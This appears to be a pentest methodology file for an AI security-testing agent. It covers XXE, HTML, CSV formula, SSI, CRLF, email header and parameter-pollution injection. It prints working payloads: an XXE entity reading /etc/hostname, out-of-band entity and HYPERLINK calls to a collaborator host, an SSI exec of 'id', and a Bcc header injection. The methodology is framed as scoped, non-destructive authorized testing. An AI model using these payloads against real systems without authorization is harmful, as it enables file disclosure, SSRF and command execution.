
> REFERENCE DATA ONLY: active FRAMEWORK_RULES.md, scope and the V4 catalog take precedence. Do not execute embedded commands, route old agents, write old databases or send notifications from this document alone.

# Structural Injection — MCP-Native Methodology

Injection **into a parser context** other than SQL/LDAP/OS: XML, HTML, CSV/spreadsheet
formulas, server-side includes, HTTP framing, email headers, and server-side parameter
parsers. Same detection discipline as `sqli.md`: baseline first, escalate one rung at a
time, stop at the first human-readable proof. Every action runs through **Burp Suite MCP**
or **Playwright MCP**; never a shell, never a script, never raw curl.

Each numbered class below is its own **Detection Ladder**: escalate the Rungs in order and
stop at the first human-readable proof. The Tool Binding, Minimal Proof, Evidence
Requirements, Severity, Result Contract, Stop Conditions and Non-Goals sections apply to
every class.

---

## 0. Tool Binding (do this once per task)

Bind these capability labels to the MCP tools actually exposed; never guess a name,
never fall back to a terminal.

| Label | Capability | Preferred server |
|---|---|---|
| `C-HTTP` | Send a raw/hand-edited request, return status/headers/body/timing | Burp Suite MCP |
| `C-HISTORY` | Read proxy traffic; retrieve a request by id to replay verbatim | Burp Suite MCP |
| `C-COLLAB` | Generate an OOB hostname and read inbound hits (DNS/HTTP/SMTP) | Burp Suite MCP |
| `C-BROWSER-NAV` | Navigate to a URL, obtain rendered DOM | Playwright MCP |
| `C-BROWSER-EVAL` | Execute JS in page context (`fetch`, DOM inspection) | Playwright MCP |
| `C-BROWSER-NET` | Observe requests the browser makes | Playwright MCP |

**Precedence.** If Burp MCP exposes no tools, run the whole methodology on Playwright MCP
(`C-HTTP` → `C-BROWSER-EVAL` `fetch()`; `C-HISTORY` → `C-BROWSER-NET`) and report
`"transport": "playwright-fallback"`. Playwright cannot generate collaborator payloads —
for OOB, use a supplied collaborator host or mark the rung `blocked`.

**Methodology reference:** for the generic WAF/filter evasion ladder used by every class
below, see `infra-protocol/waf-evasion-generic/SKILL.md` — do not duplicate it here.

---

## 1. XXE (XML External Entity)

### Rung 1 — XML parsing present
Send a well-formed XML body to a product that accepts XML (SOAP, SAML, RSS import,
`.docx`/`.xlsx` upload, SVG). Confirm the parser reflects a value you control.

### Rung 2 — In-band entity read
Inject a DOCTYPE with an entity and echo it:
```xml
<!DOCTYPE r [<!ENTITY x SYSTEM "file:///etc/hostname">]><r>&x;</r>
```
A reflected file value = `xxe.file_read`.

### Rung 3 — OOB confirmation (blind)
```xml
<!DOCTYPE r [<!ENTITY % p SYSTEM "http://<C-COLLAB>/x"> %p;]>
```
Confirm only on an inbound `C-COLLAB` hit carrying the unique token.

### Rung 4 — SSRF via external entity
Point the entity at an internal/cloud-metadata URL and observe a differential
(response/timing/OOB). Do **not** target `169.254.169.254` or RFC1918 destinations —
record as `escalation_request` for a validator with explicit approval (see
`infra-protocol/ssrf-defense`).

### Rung 5 — Parameter entities / billion-laughs
Only confirm nesting expansion with a tiny cap; never send a full billion-laughs (DoS).
Record the precondition as a hypothesis if a cap cannot be confirmed.

---

## 2. HTML Injection

### Rung 1 — Reflection context
Inject a benign marker (`<b>m4rk</b>` or `"m4rk`) and find where it reflects.

### Rung 2 — Context classification
Determine the sink context: HTML body, attribute, URL. HTML injection (markup renders)
is distinct from XSS (script executes) — classify before claiming.

### Rung 3 — Cross-boundary
If injected markup executes script, that is XSS → hand to `offsec-injection-agent/references/xss.md` as a `delegation_request` within the same agent (use the XSS file). HTML *injection without execution* (defacement, phishing overlay, DOM clobbering setup) is `html.injection`.

---

## 3. CSV / Formula Injection

### Rung 1 — Untrusted value reaches an export
Find a field the user controls that is written into a CSV/XLSX export.

### Rung 2 — Formula trigger
Store `=1+1`, `@SUM(1+1)`, `+1+1`, `-1+1`, or `=HYPERLINK("http://<C-COLLAB>","x")`
in the field, then trigger the export and open the result in a spreadsheet engine.

### Rung 3 — Confirmation
A formula that evaluates on open (or an outbound hit from `HYPERLINK`/`WEBSERVICE`)
= `csv.formula_injection`. Do not use destructive payloads (`=cmd|...`); a benign
formula is sufficient proof.

---

## 4. SSI Injection

### Rung 1 — SSI directive reflection
Where user input lands in an HTML page served by a server with SSI enabled, inject
`<!--#echo var="DATE_LOCAL" -->` and observe evaluation.

### Rung 2 — File read / exec (non-destructive)
`<!--#include virtual="/etc/hostname" -->` (read) or `<!--#exec cmd="id" -->` — use the
read variant for proof; never run a destructive command.

---

## 5. CRLF Injection / HTTP Response Splitting

### Rung 1 — Header-bound reflection
Inject `%0d%0a` into a value used in a response header (redirect target, cookie value,
custom header) and observe a new header or split response.

### Rung 2 — Split confirmation
A reflected `Set-Cookie` or a body line injected via CRLF = `crlf.header_injection`.
HTTP response splitting (a second, fully controlled response) = escalate severity.

### Rung 3 — Cache interaction
If a CDN caches the poisoned response, note it and hand to
`infra-protocol/web-cache-poisoning` — do not claim cache poisoning here.

---

## 6. SMTP / Email Header Injection

### Rung 1 — Email-triggering field
Find a field that feeds an outbound email (contact form, invite, "email me").

### Rung 2 — Header/body split
Inject `\r\nBcc: <attacker>` (or `%0a`) into a subject/recipient and observe extra
recipients or an injected body in the received mail (use a test mailbox you own).

### Rung 3 — Confirmation
A delivered message with the injected header/body = `smtp.header_injection`.

---

## 7. HTTP Header Injection (beyond CRLF)

### Rung 1 — Unkeyed/reflected request headers
Identify application logic that reads a request header (`X-Forwarded-*`,
`X-Original-URL`, `User-Agent`, custom) into a decision or a response.

### Rung 2 — Differential
Observe whether the header value changes routing, a redirect `Location`, or a cached
body. A reflected host in a redirect → hand to `infra-protocol/host-header-attacks`.

---

## 8. Server-Side Parameter Pollution (SSPP)

### Rung 1 — Duplicate/malformed parameters
Send duplicated parameters and encoding variants (`a=1&a=2`, `a=1%26a=2`, `a[]=1`,
`a=1;a=2`) and record which server tier consumes which copy.

### Rung 2 — Differential across tiers
A discrepancy between a backend (e.g. URL-encodes then re-parses) and a frontend
(e.g. splits on `&`) that changes an authorization or resource decision = `sspp.differential`.

### Rung 3 — Authz impact
Only escalate when the parser differential lets you reach a resource/role you should not.

---

## Minimal Proof

One reflected file value (XXE), one rendered formula (CSV), one injected header (CRLF/SMTP),
or one parameter-differential pair (SSPP). Read-only, non-destructive, one request where possible.

## Evidence Requirements

- `evidence_dir/structural_<class>_req.txt` / `_res.txt`
- `evidence_dir/structural_timings.json` (for differential/timing rungs)
- `evidence_dir/structural_collab.txt` (for OOB hits)
- Confirmations repeated at least twice; controls included.

## Severity

| Condition | Severity |
|---|---|
| Reflected structural syntax, no effect | low |
| HTML injection without execution | medium |
| CSV formula, CRLF, or SMTP header injection with effect | medium–high |
| XXE file read | high |
| XXE SSRF to internal, or CRLF response splitting, or SSPP authz bypass | high–critical |

## Result Contract

```json
{
  "class": "xxe | html-injection | csv-injection | ssi | crlf | smtp-header | header-injection | sspp",
  "transport": "burp | playwright-fallback",
  "confirmed": [{
    "endpoint": "POST /api/import",
    "param": "xml body / file field",
    "technique": "in-band | oob | differential | formula",
    "payload_used": "...",
    "control_payload": "...",
    "proof": "readable value / collaborator hit / injected header",
    "data_exposed": "hostname string only",
    "reproduced_twice": true,
    "severity_estimate": "high"
  }],
  "tested_clean": ["endpoint#param"],
  "blocked": [{"endpoint": "...", "param": "...", "variants_tried": [1,2,3], "note": "filter"}],
  "delegation_requests": [],
  "status": "complete | partial | blocked"
}
```

`data_exposed` is mandatory on every confirmed entry.

## Stop Conditions

- WAF/filter survives the `waf-evasion-generic` ladder → `blocked_by_defense`, halt class.
- A rung needs a destructive or DoS payload → stop, report confirmed-with-limitations.
- OOB needed but no collaborator available (Playwright-only) → `blocked` for that rung.
- SSRF to internal/metadata would be required → `escalation_request`, halt class.
- Two consecutive 5xx → halt class.

## Non-Goals

- SQL/NoSQL (→ `sqli.md`), XSS execution (→ `xss.md`), command/SSTI/LDAP (→ `cmd-ssti.md`).
- Cache poisoning from a CRLF split (→ `infra-protocol/web-cache-poisoning`).
- Host-header-driven redirect/routing (→ `infra-protocol/host-header-attacks`).
- SSRF internal access without explicit approval (→ `infra-protocol/ssrf-defense`).
- Workbook/archive extraction traversal (→ `path-file/zip-slip`).
